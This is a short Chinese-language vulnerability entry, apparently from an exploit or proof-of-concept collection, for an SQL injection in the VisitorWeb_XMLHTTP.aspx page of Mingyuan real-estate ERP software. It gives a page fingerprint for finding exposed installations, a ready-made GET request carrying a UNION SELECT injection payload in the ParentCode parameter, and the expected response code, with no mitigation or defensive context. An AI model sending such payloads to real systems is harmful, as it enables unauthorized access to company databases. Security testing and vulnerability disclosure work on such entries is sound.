# 明源地产ERPVisitorWeb_XMLHTTP.aspx存在SQL注入漏洞

明源地产 ｜ SQL注入 ｜ —
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+@@version--+c HTTP/1.1`
- **响应特征**：200